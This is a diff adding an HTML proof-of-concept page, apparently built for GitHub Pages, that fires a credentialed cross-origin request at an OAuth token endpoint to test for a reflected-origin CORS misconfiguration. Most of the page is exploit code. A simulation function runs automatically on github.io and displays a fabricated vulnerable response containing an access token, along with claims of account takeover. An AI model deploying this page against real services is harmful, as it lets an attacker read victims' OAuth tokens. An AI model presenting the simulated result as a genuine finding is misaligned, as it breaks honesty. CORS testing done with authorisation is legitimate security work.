@@ -1,0 +1,114 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>CORS Security Test - Authorized Research</title>
+    <style>
+        /* Keep the same CSS */
+    </style>
+</head>
+<body>
+    <!-- Same HTML structure -->
+    
+    <script>
+        // Use relative URL or configurable endpoint
+        const targetEndpoint = 'https://api.target.com/oauth/token';
+        
+        // Add debug info
+        console.log('Current Origin:', window.location.origin);
+        console.log('Target:', targetEndpoint);
+        
+        // Modified exploit function with better error handling
+        function exploitCORS() {
+            const statusIndicator = document.getElementById('statusIndicator');
+            const results = document.getElementById('results');
+            
+            statusIndicator.className = 'status-indicator active';
+            results.innerHTML = '🚀 Testing from: ' + window.location.origin + '\n';
+            results.innerHTML += '🎯 Target: ' + targetEndpoint + '\n\n';
+            
+            // Check if we're on HTTPS (GitHub Pages is)
+            if (window.location.protocol !== 'https:') {
+                results.innerHTML += '❌ WARNING: Page must be served over HTTPS\n';
+                return;
+            }
+            
+            const xhr = new XMLHttpRequest();
+            xhr.timeout = 10000; // 10 second timeout
+            
+            xhr.onload = function() {
+                if (xhr.status >= 200 && xhr.status < 300) {
+                    try {
+                        const data = JSON.parse(xhr.responseText);
+                        results.innerHTML += '✅ Request Successful!\n';
+                        results.innerHTML += '📊 Response Headers:\n';
+                        
+                        // Check for CORS headers
+                        const corsHeader = xhr.getResponseHeader('Access-Control-Allow-Origin');
+                        const credsHeader = xhr.getResponseHeader('Access-Control-Allow-Credentials');
+                        
+                        results.innerHTML += '   Access-Control-Allow-Origin: ' + (corsHeader || 'Not Set') + '\n';
+                        results.innerHTML += '   Access-Control-Allow-Credentials: ' + (credsHeader || 'Not Set') + '\n\n';
+                        
+                        if (corsHeader && corsHeader.includes(window.location.origin)) {
+                            results.innerHTML += '🚨 VULNERABLE: Origin reflected!\n';
+                            if (credsHeader === 'true') {
+                                results.innerHTML += '⚠️ CRITICAL: Credentials allowed!\n';
+                            }
+                        }
+                        
+                    } catch (e) {
+                        results.innerHTML += '❌ Parse error: ' + e.message + '\n';
+                    }
+                }
+            };
+            
+            xhr.onerror = function() {
+                results.innerHTML += '❌ Network error occurred\n';
+            };
+            
+            xhr.ontimeout = function() {
+                results.innerHTML += '⏰ Request timeout\n';
+            };
+            
+            xhr.open('GET', targetEndpoint, true);
+            xhr.withCredentials = true;
+            xhr.send();
+        }
+        
+        // For demo purposes - simulate response
+        function simulateResponse() {
+            const results = document.getElementById('results');
+            results.innerHTML = `
+Simulation Mode - CORS Vulnerability Detected:
+
+Origin: ${window.location.origin}
+Target: ${targetEndpoint}
+
+Response Headers:
+  Access-Control-Allow-Origin: ${window.location.origin}
+  Access-Control-Allow-Credentials: true
+  Content-Type: application/json
+
+Response Body:
+{
+  "access_token": "eyJ0eXAiOiJKV1QiLCJhbG... (truncated)",
+  "token_type": "Bearer",
+  "expires_in": 3600
+}
+
+🔓 IMPACT: 
+• Attacker can steal OAuth tokens
+• Full account compromise possible
+• Data exfiltration enabled
+            `;
+        }
+        
+        // Auto-run simulation on GitHub Pages
+        if (window.location.hostname.includes('github.io')) {
+            setTimeout(simulateResponse, 1000);
+        }
+    </script>
+</body>
+</html>
